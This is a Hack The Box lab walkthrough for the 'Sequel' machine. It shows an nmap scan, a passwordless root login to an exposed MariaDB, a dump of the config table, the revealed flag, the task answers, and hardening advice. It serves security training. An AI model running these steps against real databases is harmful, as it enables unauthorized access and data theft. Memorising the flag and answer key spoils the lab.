# 📘 Hack The Box: Sequel

> 🔗 https://app.hackthebox.com/machines/Sequel

---

## 🎯 Goal

Connect to the remote SQL service, enumerate the available databases, and retrieve the flag from a table.

---

## 🧠 Key Idea

This lab demonstrates a common database misconfiguration:

- the MySQL/MariaDB service is exposed over the network;
- the database port is externally accessible;
- login as `root` is possible without a password;
- data can be extracted directly through a SQL client.

The core idea of the machine is **service enumeration + direct database access**.

Unlike Appointment, where SQL Injection was performed through a web login form, here we interact with the SQL service directly from the command line.

---

## 🧩 Theory: What are MySQL and MariaDB?

**MySQL** is a relational database management system.

**MariaDB** is a MySQL-compatible database system commonly used on Linux servers.

Databases may store:

- users;
- passwords;
- application settings;
- tokens;
- configuration values;
- flags in training labs;
- sensitive business data.

If a database is exposed to the network and does not require a password, it becomes a serious security issue.

---

## 🔍 Walkthrough

### Step 1 — Scan the target

```bash
nmap -sC -sV <TARGET_IP>
```

### Why this works

`nmap` helps identify:

- open ports;
- exposed services;
- service versions.

The `-sC` flag runs the default NSE scripts.  
The `-sV` flag performs service version detection.

### Scan result

```text
3306/tcp open  mysql?
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
Auth Plugin Name: mysql_native_password
```

### What we learn

The open port is:

```text
3306/tcp
```

The running service is:

```text
MySQL / MariaDB
```

### Why this matters

Port **3306** is the default port for MySQL/MariaDB.

If this port is open, it may be possible to connect to the database service directly.

---

## 🧠 How to think after nmap

After discovering a database service, the right questions are:

1. Can I connect to this service directly?
2. What client do I need?
3. Is authentication required?
4. Can I try a default or privileged user?
5. What data is accessible after login?

This is the proper pentester logic:

> port → service → interaction method → access check → data extraction

---

## Step 2 — Connect to MySQL/MariaDB

The client used to connect is:

```bash
mysql
```

Basic command format:

```bash
mysql -h <TARGET_IP> -u <USERNAME>
```

Where:

- `-h` specifies the host;
- `-u` specifies the login username.

### Attempt to connect as root

```bash
mysql -h <TARGET_IP> -u root
```

In this case, a modern MySQL client may return:

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Why this happens

The client attempts to use SSL/TLS, but the MariaDB server on the machine does not support it.

This is not a login failure and does not mean access is impossible.  
It is a connection-parameter issue.

### Fix

Disable SSL:

```bash
mysql -h <TARGET_IP> -u root --skip-ssl
```

After that, access is granted:

```text
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

---

## 💥 Vulnerability

The `root` user can connect without a password.

This is a serious misconfiguration:

- the database is exposed over the network;
- root access is not password-protected;
- an attacker can enumerate databases and tables;
- sensitive data can be extracted directly.

A good way to describe it:

> **Exposed database service with weak/no authentication**

or:

> **Improper access control on database service**

---

## Step 3 — List available databases

Inside MariaDB, run:

```sql
SHOW databases;
```

### Result

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Why this matters

The list contains several databases:

- `information_schema` — system database;
- `mysql` — MySQL/MariaDB system database;
- `performance_schema` — system database for performance metrics;
- `htb` — user-created database clearly related to the lab.

Therefore, the logical next step is to switch to the `htb` database.

---

## Step 4 — Select the database

```sql
USE htb;
```

MariaDB responds:

```text
Database changed
```

This means all following SQL commands will run in the context of the `htb` database.

---

## Step 5 — List tables

```sql
SHOW tables;
```

### Result

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Why this matters

Two tables are visible:

- `users`;
- `config`.

From a pentester perspective, both are interesting.

`users` may contain usernames, passwords, or hashes.  
`config` may contain application settings, keys, parameters, and sometimes flags.

---

## Step 6 — Show table columns

To inspect the structure of a table, use:

```sql
DESCRIBE config;
```

or:

```sql
SHOW COLUMNS FROM config;
```

### Why this is useful

These commands show:

- column names;
- data types;
- keys;
- whether a field can be `NULL`.

This is useful when the table is large and you want to understand its structure before running `SELECT *`.

---

## Step 7 — Extract data

Check the contents of the `config` table:

```sql
SELECT * FROM config;
```

### Result

```text
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

The table contains a row where:

```text
name = flag
```

The actual flag is stored in the `value` column.

---

## 🔐 Flag

<details>
<summary>Show flag</summary>

7b4bec00d1a39e3dd4e021ec3d915da8

</details>

---

## 📋 Task Answers

<details>
<summary>Show answers</summary>

1. 3306  
2. MariaDB  
3. -u  
4. root  
5. *  
6. ;  
7. htb  
8. USE  
9. DESCRIBE  
10. config  

</details>

---

## 🛠️ Essential MySQL/MariaDB Commands

### Connect to the server

```bash
mysql -h <TARGET_IP> -u <USERNAME> --skip-ssl
```

### Show databases

```sql
SHOW databases;
```

### Select a database

```sql
USE <database_name>;
```

### Show tables

```sql
SHOW tables;
```

### Show table columns

```sql
DESCRIBE <table_name>;
```

or:

```sql
SHOW COLUMNS FROM <table_name>;
```

### Dump all rows from a table

```sql
SELECT * FROM <table_name>;
```

---

## 🛡️ Recommendations

To prevent this issue:

- do not expose MySQL/MariaDB externally unless required;
- restrict access with firewall rules;
- allow connections only from trusted IP addresses;
- disable remote root login;
- enforce strong passwords;
- use separate low-privilege accounts for applications;
- enable TLS when required;
- regularly audit database configuration;
- avoid storing sensitive data in plaintext.

---

## 🛠️ Checklist

- [ ] Scan the target with `nmap`
- [ ] Identify port `3306`
- [ ] Detect MySQL/MariaDB
- [ ] Attempt connection with `mysql`
- [ ] Test root login
- [ ] Disable SSL with `--skip-ssl` if needed
- [ ] Run `SHOW databases;`
- [ ] Select the `htb` database
- [ ] Run `SHOW tables;`
- [ ] Inspect the `config` table
- [ ] Find and retrieve the flag

---

## 📚 What this machine teaches

Sequel teaches the basics of working with SQL services from a beginner pentester perspective.

Core skills:

- reading `nmap` output correctly;
- understanding the significance of port `3306`;
- connecting to a database from the command line;
- distinguishing between system and user-created databases;
- using basic SQL commands;
- searching tables for sensitive data;
- understanding the risk of exposed root access without a password.

This machine demonstrates an important principle:

> Exploitation is not always about a complex exploit. Sometimes it is simply a dangerous service misconfiguration.

---

## 🧠 Final attack chain

```text
nmap → 3306/tcp → MySQL/MariaDB → root without password → SHOW databases → USE htb → SHOW tables → SELECT * FROM config → flag
```
